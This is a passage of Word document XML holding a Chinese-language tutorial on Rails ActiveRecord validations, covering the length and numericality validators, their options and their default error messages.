          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>:tokenizer</w:t>
      </w:r>
      <w:r w:rsidRPr="00C4218B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve"> 选项来使用不同的方式分割属性值</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7176"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w:rsidRPr="002A2B82" w14:paraId="7A5D2FFA" w14:textId="77777777" w:rsidTr="00C4218B">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2739345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Essay &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="589AD96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:content, :length</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; {</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4792594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:minimum</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve">   </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; 300,</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="54778FA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:maximum</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve">   </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; 400,</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="09CE962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C4218B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>tokenizer</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; lambda { |str| str.scan(/\w+/) },</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5562BDD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C4218B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>too_short</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; "must have at least %{count} words",</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4818D37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C4218B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>too_long</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve">  </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; "must have at most %{count} words"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7B76571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p>
          <w:p w14:paraId="05F746A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406917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需要注意的是默认的错误信息为复数形式(如，"is too short (minimum is %{count} characters)")。因此，当 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:minimum</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 为1的时候，你需要指定一个错误信息或者使用 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>validates_presence_of</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 来替换。当 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:in</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 或 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:within</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 的下限为1时，你也需要指定一个错误信息或者在该 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>length</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 校验前添加一个 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>presence</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 校验。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B066D32"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size</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 校验是 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>length</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 校验的别名。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70980C80" w14:textId="53E279A1"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3.8 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>numericality</w:t>
      </w:r>
      <w:r w:rsidR="00BC5D40">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 整数或浮点数</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="142475B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该校验用来检验属性值</w:t>
      </w:r>
      <w:r w:rsidRPr="009B64D1">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>仅含有数字</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。默认会匹配</w:t>
      </w:r>
      <w:r w:rsidRPr="009B64D1">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>整数和浮点数</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">。可以通过设置 </w:t>
      </w:r>
      <w:r w:rsidRPr="009B64D1">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>:only_integer</w:t>
      </w:r>
      <w:r w:rsidRPr="009B64D1">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve"> 为 true 来使其只匹配整数</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55C51159"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如果你将 </w:t>
      </w:r>
      <w:r w:rsidRPr="009B64D1">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>:only_integer</w:t>
      </w:r>
      <w:r w:rsidRPr="009B64D1">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve"> 设置为 </w:t>
      </w:r>
      <w:r w:rsidRPr="009B64D1">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>true</w:t>
      </w:r>
      <w:r w:rsidRPr="009B64D1">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>，将使用如下的正则表达式来验证属性值</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1896"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w:rsidRPr="002A2B82" w14:paraId="5C6B423B" w14:textId="77777777" w:rsidTr="007C3C58">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="043766B1" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="781462005"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>/\A[+-]?\d+\Z/</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="19D8B88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否则，该校验将会尝试将被校验的值先通过 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Float</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 转换为浮点数。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A2C373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请注意</w:t>
      </w:r>
      <w:r w:rsidRPr="007C3C58">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>上面的正则允许以换行符结尾</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522"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w:rsidRPr="002A2B82" w14:paraId="0821E751" w14:textId="77777777" w:rsidTr="007C3C58">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7D4EEB7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Player &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="57ACB7D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xml:space="preserve">  validates :points, </w:t>
            </w:r>
            <w:r w:rsidRPr="007C3C58">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>:numericality</w:t>
            </w:r>
            <w:r w:rsidRPr="007C3C58">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="007C3C58">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>=&gt; true</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1816353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xml:space="preserve">  validates :games_played, </w:t>
            </w:r>
            <w:r w:rsidRPr="007C3C58">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>:numericality</w:t>
            </w:r>
            <w:r w:rsidRPr="007C3C58">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="007C3C58">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>=&gt; { :only_integer</w:t>
            </w:r>
            <w:r w:rsidRPr="007C3C58">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="007C3C58">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>=&gt; true</w:t>
            </w:r>
            <w:r w:rsidRPr="007C3C58">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="007C3C58">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>}</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="27050F1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17B3B3BE" w14:textId="71311B76" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="00BC5D40" w:rsidP="002A2B82">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kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>除</w:t>
      </w:r>
      <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:only_integer</w:t>
      </w:r>
      <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 外，该校验也接受如下的选项来为被校验值添加额外的约束：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64034508" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="3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:greater_than</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> – </w:t>
      </w:r>
      <w:r w:rsidRPr="00BC5D40">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>被校验的属性值</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC5D40">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>必须大于指定的值</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。该选项的默认错误信息为 “</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:i/>
          <w:iCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>must be greater than %{count}</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>”。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C7C28E8" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="3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:greater_than_or_equal_to</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> – 被校验的属性值</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC5D40">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>必须大于或等于指定的值</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。该选项的默认错误信息为 “</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:i/>
          <w:iCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>must be greater than or equal to %{count}</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>”。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="723A46C9" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="3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:equal_to</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> – 被校验的属性值</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC5D40">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
